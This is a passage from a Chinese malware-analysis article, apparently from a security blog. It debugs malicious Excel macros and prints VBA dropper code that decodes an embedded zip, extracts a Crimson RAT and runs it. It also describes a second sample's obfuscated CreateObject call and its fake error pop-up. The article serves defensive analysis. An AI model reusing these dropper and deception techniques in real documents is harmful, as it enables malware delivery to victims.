border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">运行到光标处 Ctrl + F8 相当于od中的F4</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">此外，在宏调试器中，设置断点是F9，运行程序是F5。所以我们之后在调试宏代码时，我们也可以直接在某行代码设置断点，然后F5运行到断点处。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们这里直接F8就是在当前的模块窗口中，开始调试宏代码，调试的方式是单步运行。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">通常来说，F8运行之后，程序就会停在该模块的入口点。标黄显示，并且在最下面的本地窗口中会显示一些将要使用到的变量。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.4993765586034913" data-type="png" data-w="1604" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/15_aa2SSccyUYtZhTG6VQofDDaOpp6bHw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibxD5px91kSxibL7b41Y4mGd89Zaa2SSccyUYtZhTG6VQofDDaOpp6bHw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">有时候不小心关闭了本地窗口，我们需要在视图窗口中重新打开。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="1.0050761421319796" data-type="png" data-w="394" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/16_xbKK1ZVwicoR7LJgnmqrSbzkL5p1aA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib2MPSVaCQKv2yIrsS3YF59JCAlxbKK1ZVwicoR7LJgnmqrSbzkL5p1aA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接下来我们来看看代码，既然是调试VBA的代码，我们需要先对VBA的语法有个认识。比如应该知道Dim用于定义变量。<br style="box-sizing: border-box;"  />在代码最开始，程序定义了多个变量</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer">    Dim path_Aldi_file <span class="code-snippet__keyword">As</span> String</span></code><code><span class="code-snippet_outer">    Dim file_Aldi_name  <span class="code-snippet__keyword">As</span> String</span></code><code><span class="code-snippet_outer">    Dim zip_Aldi_file  <span class="code-snippet__keyword">As</span> Variant</span></code><code><span class="code-snippet_outer">    Dim fldr_Aldi_name  <span class="code-snippet__keyword">As</span> Variant</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    Dim byt() <span class="code-snippet__keyword">As</span> Byte</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    Dim ar1Aldi() <span class="code-snippet__keyword">As</span> String</span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">然后通过<br style="box-sizing: border-box;"  />file_Aldi_name = “rlbwrarhsa”<br style="box-sizing: border-box;"  />对file_Aldi_name进行了赋值。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">通过<br style="box-sizing: border-box;"  />fldr_Aldi_name = Environ$(“ALLUSERSPROFILE”) &amp; “Tdlawis”<br style="box-sizing: border-box;"  />对fldr_Aldi_name进行赋值。<br style="box-sizing: border-box;"  />其中，Environ$(“ALLUSERSPROFILE”) 表示获取%ALLUSERSPROFILE%环境变量，&amp;符号表示拼接。<br style="box-sizing: border-box;"  />所以该语句运行完之后，fldr_Aldi_name = %ALLUSERSPROFILE%Tdlawis<br style="box-sizing: border-box;"  />当然，我们也可以直接按F8单步往下走，在调试器中查看对应的值，这是最快的方法。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.6313645621181263" data-type="png" data-w="982" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/17_u4w04sCkFAFrenydHdy9lF2v2BT4KQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibuJF3sXO7dsR57qPbUskCLV2su4w04sCkFAFrenydHdy9lF2v2BT4KQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接下来，程序通过VBA的Dir方法判断上面的fldr_Aldi_name路径是否存在，如果不存在则通过MkDir创建该路径。</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="powershell"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">If</span> Dir(fldr_Aldi_name, vbDirectory) = <span class="code-snippet__string">""</span> Then</span></code><code><span class="code-snippet_outer">   MkDir (fldr_Aldi_name)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">End</span> <span class="code-snippet__keyword">If</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">Tdlawis路径创建成功之后，程序将对fldrz_Aldi_name 重新赋值，并且通过同样的手法尝试创建%ALLUSERSPROFILE%Dlphaws路径。</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="powershell"><code><span class="code-snippet_outer">    fldrz_Aldi_name = Environ$(<span class="code-snippet__string">"ALLUSERSPROFILE"</span>) &amp; <span class="code-snippet__string">"Dlphaws"</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">If</span> Dir(fldrz_Aldi_name, vbDirectory) = <span class="code-snippet__string">""</span> Then</span></code><code><span class="code-snippet_outer">        MkDir (fldrz_Aldi_name)</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">End</span> <span class="code-snippet__keyword">If</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接下来程序通过<br style="box-sizing: border-box;"  />zip_Aldi_file = fldrz_Aldi_name &amp; “omthrpa.zip”<br style="box-sizing: border-box;"  />声明一个zip路径，路径应该为%ALLUSERSPROFILE%Dlphawsomthrpa.zip</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">通过<br style="box-sizing: border-box;"  />path_Aldi_file = fldr_Aldi_name &amp; file_Aldi_name &amp; “.exe”<br style="box-sizing: border-box;"  />声明一个path路径，路径应该为：%ALLUSERSPROFILE%Tdlawisrlbwrarhsa.exe</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.6796657381615598" data-type="png" data-w="1077" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/18_Zt7tek0IqumbpOX8FUlYcpTdFibQZw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibrneqywDWG9VwQAzNFZeZDbic9CZt7tek0IqumbpOX8FUlYcpTdFibQZw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接下来，程序通过Application.OperatingSystem获取当前操作系统的版本并根据不同的情况进行不同的处理，如果当前系统版本为6.02或6.03，程序将获取UserForm1.TextBox2.Text的信息赋值给ar1Aldi。否则获取UserForm1.TextBox1.Text的内容赋值给ar1Aldi。</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">If</span> InStr(Application.OperatingSystem, <span class="code-snippet__string">"6.02"</span>) &gt; <span class="code-snippet__number">0</span> <span class="code-snippet__keyword">Or</span> InStr(Application.OperatingSystem, <span class="code-snippet__string">"6.03"</span>) &gt; <span class="code-snippet__number">0</span> Then</span></code><code><span class="code-snippet_outer">        ar1Aldi = Split(UserForm1.TextBox2.Text, <span class="code-snippet__string">":"</span>)</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">Else</span></span></code><code><span class="code-snippet_outer">        ar1Aldi = Split(UserForm1.TextBox1.Text, <span class="code-snippet__string">":"</span>)</span></code><code><span class="code-snippet_outer">    End <span class="code-snippet__keyword">If</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">关于获取操作系统版本信息的文档，可在https://docs.microsoft.com/zh-cn/office/vba/api/excel.application.operatingsystem</span><span style="font-size:15px;line-height:35px;;">找到。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">操作系统判断完成之后，程序就会将我们之前看到的窗体中的数据赋值给ar1Aldi变量：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.48746518105849584" data-type="png" data-w="1436" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/19_ehyfpYpFYamVFlfViaSGgSicW5wuBw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibjvDDbtBU3wSBMkTJ0ytuzzrOMaehyfpYpFYamVFlfViaSGgSicW5wuBw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">然后通过一个for each循环对刚才赋值的ar1Aldi进行解密：</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer"><span class="code-snippet__attr">For</span> <span class="code-snippet__string">Each vl In ar1Aldi</span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__attr">ReDim</span> <span class="code-snippet__string">Preserve btsAldi(linAldi)</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__meta">btsAldi(linAldi)</span> = <span class="code-snippet__string">CByte(vl)</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__attr">linAldi</span> = <span class="code-snippet__string">linAldi + 1</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__attr">Next</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">然后我们可以直接光标定位到循环后面的代码，按Ctrl + F8 跑完循环</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.36075949367088606" data-type="png" data-w="474" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/20_ibJcricXicUzicUUUC4xMce0XSmE6w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibB9rXSDU2L3kRr4hzpQmjQzVc1icaYibJcricXicUzicUUUC4xMce0XSmE6w/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">这里我们可以看到，程序会通过二进制流的方式打开zip_Aldi_file，也就是先前定义的zip文件，然后将刚才的btsAldi进行写入。</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer">  Open zip_Aldi_file <span class="code-snippet__keyword">For</span> Binary Access Write <span class="code-snippet__keyword">As</span> <span class="code-snippet__comment">#2</span></span></code><code><span class="code-snippet_outer">         Put <span class="code-snippet__comment">#2, , btsAldi</span></span></code><code><span class="code-snippet_outer">    Close <span class="code-snippet__comment">#2</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.15512048192771086" data-type="png" data-w="1328" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/21_AG3pwdqj0KgiaslDD6zZ3pbIliaWqg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibFZcYbOud4L4yV2j4xnZyBzYxxnAG3pwdqj0KgiaslDD6zZ3pbIliaWqg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">写入成功之后，程序会尝试将该zip包进行解压。</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer">     <span class="code-snippet__attr">If</span> <span class="code-snippet__string">Len(Dir(path_Aldi_file)) = 0 Then</span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__attr">Call</span> <span class="code-snippet__string">unAldizip(zip_Aldi_file, fldr_Aldi_name)</span></span></code><code><span class="code-snippet_outer">    <span class="code-snippet__attr">End</span> <span class="code-snippet__string">If</span></span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">解压的文件是zip_Aldi_file，解压的路径是fldr_Aldi_name<br style="box-sizing: border-box;"  />解压成功后将会在fldr_Aldi_name目录下出现目标文件：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.18988326848249026" data-type="png" data-w="1285" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/22_fw9H4Ut8sHpdVxneR6Frricb3VHolg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibbyarib7sa3US4NYcOGKbfL5u7vfw9H4Ut8sHpdVxneR6Frricb3VHolg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">最后程序通过<br style="box-sizing: border-box;"  />Shell path_Aldi_file, vbNormalNoFocus<br style="box-sizing: border-box;"  />启动该exe，程序即从xls文件成功转入到了exe文件运行。<br style="box-sizing: border-box;"  />由于该exe由C#编写，是一个Crimson远控，关于该类木马的分析，将在后续的文章中进行介绍。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">从这个样本中，我们初步了解了office宏代码的攻击方式。<br style="box-sizing: border-box;"  />1.诱导用户启用宏，诱导方式，如果不启用宏，xls文档打开之后将不现实任何内容<br style="box-sizing: border-box;"  />2.将预定义的zip数据流简单转换之后写入到窗体中<br style="box-sizing: border-box;"  />3.根据操作系统版本的不同，取窗体中不同的值<br style="box-sizing: border-box;"  />4.将取出来的数据进行简单变换之后还原为zip文件<br style="box-sizing: border-box;"  />5.解压zip文件得到一个Crimson远控<br style="box-sizing: border-box;"  />6.运行该远控</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">&nbsp;</span></section><section data-tools="新媒体排版" data-id="13745" data-style-type="标题"><section data-tools="新媒体管家" style="width: fit-content;visibility: visible;max-width: 100%;"><section style="display: flex;justify-content: center;margin: 0px 16px;visibility: visible;max-width: 100%;"><section data-darkmode-bgimage="1" data-darkmode-bgimage-15933958453571="1" data-darkmode-color="rgba(0,0,0,0.9)" data-darkmode-color-15933958453571="#191919" data-style="width: 63px; height: 24px; background-image: url(&quot;https://static.xmt.cn/img/08213e0d39b942e78aea5e14f79271c4.png&quot;); background-size: contain; background-position: center center; transform: translateY(2px); visibility: visible;" style="width: 63px;height: 24px;background-image: url(&quot;https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPiblKcBL4WXNMFxZpdoW1ubgIvObsmLSy3XnbElbHqFibzvKSDiauWbfyQA/640?wx_fmt=png&quot;);background-size: contain;background-position: center center;transform: translateY(2px);visibility: visible;max-width: 100%;"><br data-darkmode-bgimage-15933958453571="1" data-darkmode-color-15933958453571="#191919" style="visibility: visible;" data-darkmode-bgimage="1" data-darkmode-color="rgba(0,0,0,0.9)"  /><br style="display:none;"  /></section><section style="display: flex;align-items: flex-end;font-size:16px;line-height:36px;;font-weight: 700;color: rgb(182, 0, 0);letter-spacing: 1.78px;text-align: center;line-height: 22px;font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif;margin: 0px 12px;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-style="display: flex; align-items: flex-end; font-size:16px;line-height:36px;; font-weight: 700; color: rgb(182, 0, 0); letter-spacing: 1.78px; text-align: center; line-height: 22px; font family: &#39;PingFang SC&#39;, 微软雅黑, mp-quote, -apple-system-font, BlinkMacSystemFont, &#39;Helvetica Neue&#39;, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei UI&#39;, &#39;Microsoft YaHei&#39;, Arial, sans-serif; margin: 0px 12px; visibility: visible;" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)"><section style="min-width: 16px;white-space: nowrap;visibility: visible;max-width: 100%;" data-darkmode-color-15933958453571="rgb(255, 22, 22)" data-darkmode-original-color-15933958453571="rgb(182, 0, 0)" data-darkmode-color="rgb(255, 22, 22)" data-darkmode-original-color="rgb(182, 0, 0)">0x03 donot恶意文档分析</section></section></section></section></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">样本md5：4428912f168f3f1f0554126de7b4eced<br style="box-sizing: border-box;"  />any沙箱连接为：<br style="box-sizing: border-box;"  /></span><span style="font-size:15px;line-height:35px;;">https://app.any.run/tasks/2d9a7598-47d9-46a9-9d03-9b3ece716fa6/</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">同样的，通过any沙箱，我们可以得知该样本还是一个xls文档，我们将样本下载到本地并添加xls后缀打开。<br style="box-sizing: border-box;"  />同样的弹出了禁用宏的提示框：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.6976744186046512" data-type="png" data-w="473" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/23_Ah7wuth5nPRoubO96F4nNSUuwF2myw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibk8I6gpU7yxQt118zq4hHX5PgAh7wuth5nPRoubO96F4nNSUuwF2myw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">启用宏之后，程序看起来是报错了</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.5635467980295567" data-type="png" data-w="1015" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/24_Ushv6N3fDgSneECX2Ma7brX1wibvTg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibCdrK0xXSzpGXaQyrv0QorRwxgUshv6N3fDgSneECX2Ma7brX1wibvTg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">之前的经验告诉我们，这样的弹框信不得，我们单击确定之后，还是通过ALT + F11打开宏调试窗口，单击左边的对象时，发现该文档有密码保护：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.36811023622047245" data-type="png" data-w="508" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/25_2fundyXFdrp2Y9SgtSiceSZH6Hktqg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibhhmNrlXibApMGX6sbSqFjnYwFv2fundyXFdrp2Y9SgtSiceSZH6Hktqg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">通过之前介绍的工具，将密码去除之后重新打开，得到对象列表如下：</span></section><p><br  /></p><p style="text-align: center;"><img class="rich_pages" data-ratio="1.2507552870090635" data-s="300,640" data-type="png" data-w="331" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/26_gyOJDhcje8ibkgPN0HJ36CoMaTmb0A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibFjUkARymdhP4rgmJwXRh10ic3bgyOJDhcje8ibkgPN0HJ36CoMaTmb0A/640?wx_fmt=png'" style=""  /></p><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们通过观察，可以得知关键的代码在名为ThisWorkbook的对象中：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.4837310195227766" data-type="png" data-w="922" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/27_olndKsBZexFdnNXzCyP6peja3ZFkTg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibRxEdPTvqNdlyA8Ffiam0Flv2eolndKsBZexFdnNXzCyP6peja3ZFkTg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">同样的，我们对该段代码进行调试分析。<br style="box-sizing: border-box;"  />代码开头还是通过Dim定义了几个变量，然后通过Environ获取了环境变量APPDAT和TEMP的路径分别赋值给Digital和request<br style="box-sizing: border-box;"  />Digital = Environ$(“APPDATA”)<br style="box-sizing: border-box;"  />request = Environ$(“TEMP”)</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接着通过<br style="box-sizing: border-box;"  />Application.Wait Now + TimeValue(“0:00:03”)<br style="box-sizing: border-box;"  />休眠3秒</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">休眠之后通过<br style="box-sizing: border-box;"  />a = MsgBox(“Microsoft Excel has stopped working”, vbCritical, “Warning”)<br style="box-sizing: border-box;"  />进行弹框，弹框内容就是我们先前看到的提示框，这就是第二种迷惑用户的手法。<br style="box-sizing: border-box;"  />在上一个样本中，恶意宏代码运行之后，程序会显示一个看起来正常的xls文档以消除用户的疑心。在本样本中，恶意代码运行之后，程序是通过弹框提示用户文档打开错误以消除用户的疑心。两种方法的目标都在于，让用户误以为，打开的文档是没有问题的。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">弹框之后，程序会通过<br style="box-sizing: border-box;"  />sunjava = “Scr” + “ipting.File” + “System” + “Object”<br style="box-sizing: border-box;"  />Set digit = CreateObject(sunjava)<br style="box-sizing: border-box;"  />创建一个Scripting.FileSystemObject对象</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: left;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">接着程序将通过</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, 